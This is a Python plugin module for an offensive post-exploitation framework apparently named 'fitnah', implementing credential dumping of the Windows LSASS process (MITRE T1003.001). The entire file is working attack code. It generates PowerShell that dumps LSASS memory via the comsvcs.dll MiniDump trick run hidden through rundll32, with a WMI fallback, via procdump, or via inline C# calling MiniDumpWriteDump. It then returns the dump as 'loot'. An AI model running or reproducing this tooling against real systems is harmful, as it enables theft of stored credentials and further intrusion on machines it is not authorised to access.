"""credential_access/lsass_dump — LSASS dump via multiple methods. MITRE T1003.001"""
from fitnah.sdk import BasePlugin, ModuleResult, mitre
from fitnah.sdk.schema import Param, ParamSchema


class LsassDump(BasePlugin):
    NAME        = "lsass_dump"
    DESCRIPTION = "Dump LSASS via comsvcs LOLBin / ProcDump / Out-Minidump inline C#. Requires elevation."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1003.001"
    CATEGORY    = "credential_access"

    schema = ParamSchema().add(
        Param("method",       str, required=False, default="comsvcs",
              help="comsvcs | procdump | minidump (inline C# MiniDumpWriteDump)"),
        Param("out_path",     str, required=False, default="",
              help="Output dump path (default: auto in TEMP)"),
        Param("pid_override", int, required=False, default=0,
              help="Override LSASS PID (0 = auto-detect)"),
    )

    # Inline C# for MiniDumpWriteDump (method 3)
    _CS_MINIDUMP = (
        "using System;"
        "using System.Runtime.InteropServices;"
        "using System.Diagnostics;"
        "public class MiniDumper {"
        "  [DllImport(\"dbghelp.dll\", SetLastError=true)]"
        "  public static extern bool MiniDumpWriteDump("
        "    IntPtr hProcess, uint processId, IntPtr hFile,"
        "    uint dumpType, IntPtr exceptionParam,"
        "    IntPtr userStreamParam, IntPtr callbackParam);"
        "  public static string Dump(int pid, string outPath) {"
        "    try {"
        "      Process proc = Process.GetProcessById(pid);"
        "      using (System.IO.FileStream fs = new System.IO.FileStream(outPath,"
        "        System.IO.FileMode.Create, System.IO.FileAccess.Write)) {"
        "        bool ok = MiniDumpWriteDump(proc.Handle, (uint)pid, fs.SafeFileHandle.DangerousGetHandle(),"
        "          0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);"
        "        if (ok) return \"OK:\" + outPath;"
        "        else return \"ERR:MiniDumpWriteDump failed error=\" + Marshal.GetLastWin32Error();"
        "      }"
        "    } catch (Exception ex) { return \"ERR:\" + ex.Message; }"
        "  }"
        "}"
    )

    @mitre("T1003.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        if session.priv_level not in ("SYSTEM", "Admin", "system", "admin"):
            return ModuleResult.err("Requires elevated privileges (SYSTEM or Admin)")

        method       = params.get("method", "comsvcs").lower()
        out_path     = params.get("out_path", "")
        pid_override = int(params.get("pid_override", 0))
        cs_src       = self._CS_MINIDUMP

        pid_ps = (
            "$lsassPid = " + str(pid_override) + ";"
            "if ($lsassPid -eq 0) { $lsassPid = (Get-Process lsass -EA Stop).Id };"
        )

        out_ps = (
            "$out = if ('" + out_path.replace("'", "''") + "' -ne '') {"
            "  '" + out_path.replace("'", "''") + "'"
            "} else {"
            "  \"$env:TEMP\\$(Get-Random).dmp\""
            "};"
        )

        if method == "comsvcs":
            ps = (
                "$results = @();"
                + pid_ps + out_ps +
                "try {"
                "  $proc = Start-Process -FilePath \"$env:SystemRoot\\System32\\rundll32.exe\""
                "    -ArgumentList \"$env:SystemRoot\\System32\\comsvcs.dll, MiniDump $lsassPid `\"$out`\" full\""
                "    -WindowStyle Hidden -Wait -PassThru -EA Stop;"
                "  Start-Sleep -Seconds 3;"
                "  if (Test-Path $out) {"
                "    $sz = (Get-Item $out).Length;"
                "    $results += \"[+] comsvcs LOLBin SUCCESS  PID=$lsassPid  Size=$([Math]::Round($sz/1MB,2)) MB\";"
                "    $results += \"    Dump: $out\";"
                "  } else {"
                "    $results += \"[-] comsvcs: file not created (exit=$($proc.ExitCode))\";"
                "    $results += \"[*] Trying WMI indirect...\";"
                "    $wmiCmd = \"$env:SystemRoot\\System32\\rundll32.exe $env:SystemRoot\\System32\\comsvcs.dll MiniDump $lsassPid `\"$out`\" full\";"
                "    $wmi = [wmiclass]'Win32_Process';"
                "    $ret = $wmi.Create($wmiCmd);"
                "    Start-Sleep -Seconds 5;"
                "    if (Test-Path $out) {"
                "      $sz = (Get-Item $out).Length;"
                "      $results += \"[+] WMI comsvcs SUCCESS  Size=$([Math]::Round($sz/1MB,2)) MB\";"
                "    } else { $results += \"[-] WMI also failed (ReturnValue=$($ret.ReturnValue))\"; };"
                "  };"
                "} catch { $results += \"[!] comsvcs method: $_\" };"
                "$results -join \"`n\""
            )

        elif method == "procdump":
            ps = (
                "$results = @();"
                + pid_ps + out_ps +
                "$pd = Get-Command procdump.exe -EA SilentlyContinue;"
                "if (-not $pd) { $results += '[!] procdump.exe not found in PATH'; $results -join \"`n\"; exit };"
                "$results += '[*] Running procdump.exe -ma lsass.exe...';"
                "& procdump.exe -ma lsass.exe \"$out\" -accepteula 2>&1 | ForEach-Object { $results += \"  $_\" };"
                "if (Test-Path $out) {"
                "  $sz = (Get-Item $out).Length;"
                "  $results += \"[+] procdump SUCCESS  Size=$([Math]::Round($sz/1MB,2)) MB\";"
                "  $results += \"    Dump: $out\";"
                "} else { $results += '[-] procdump: output file not created' };"
                "$results -join \"`n\""
            )

        else:  # minidump — inline C# MiniDumpWriteDump
            ps = (
                "$results = @();"
                + pid_ps + out_ps +
                "Add-Type -TypeDefinition '" + cs_src + "' -Language CSharp;"
                "$results += \"[*] Out-Minidump via MiniDumpWriteDump PID=$lsassPid\";"
                "$res = [MiniDumper]::Dump($lsassPid, $out);"
                "if ($res.StartsWith('OK:')) {"
                "  $sz = (Get-Item $out).Length;"
                "  $results += \"[+] MiniDump SUCCESS  Size=$([Math]::Round($sz/1MB,2)) MB\";"
                "  $results += \"    Dump: $out\";"
                "} else {"
                "  $results += \"[-] MiniDump failed: $res\";"
                "};"
                "$results -join \"`n\""
            )

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"], loot_kind="lsass_dump")
